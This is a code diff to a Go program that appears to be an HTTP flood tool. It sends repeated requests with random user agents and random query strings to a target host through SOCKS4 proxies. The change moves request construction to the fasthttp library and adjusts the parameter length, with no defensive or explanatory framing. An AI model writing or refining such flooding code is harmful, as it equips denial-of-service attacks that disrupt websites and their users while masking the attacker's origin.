@@ -12,6 +12,7 @@ import (
 
 	browser "github.com/EDDYCJY/fake-useragent"
 	"github.com/gamexg/proxyclient"
+	"github.com/valyala/fasthttp"
 )
 
 // Returns an array of User-agent
@@ -42,7 +43,7 @@ func randomString(n int) string {
 }
 
 func randomParam() string {
-	return fmt.Sprintf("?%s=%s", randomString(5), randomString(1000))
+	return fmt.Sprintf("?%s=%s", randomString(5), randomString(50))
 }
 
 func readLines(fileName string) []string {
@@ -59,15 +60,12 @@ func readLines(fileName string) []string {
 func handle(host, port, method, path, useragent, proxy string, n int) {
 	var conn net.Conn
 
-	request := []byte(fmt.Sprintf(
-		"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
-		method,
-		path+randomParam(),
-		host,
-		useragent,
-	))
-
-	address := fmt.Sprintf("%s:%s", host, port)
+	var h fasthttp.RequestHeader
+	h.SetRequestURI(path + randomParam())
+	h.SetMethod(method)
+	h.SetHost(host)
+	h.SetUserAgent(useragent)
+	header := []byte(h.String())
 
 	// Dialer
 	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
@@ -77,7 +75,7 @@ func handle(host, port, method, path, useragent, proxy string, n int) {
 	}
 
 	// Connect
-	conn, err = dialer.DialTimeout("tcp", address, 5*time.Second)
+	conn, err = dialer.DialTimeout("tcp", fmt.Sprintf("%s:%s", host, port), 5*time.Second)
 
 	if err != nil {
 		return
@@ -92,7 +90,7 @@ func handle(host, port, method, path, useragent, proxy string, n int) {
 
 	defer conn.Close()
 	for i := 0; i < n; i++ {
-		conn.Write(request)
+		conn.Write(header)
 	}
 }
 
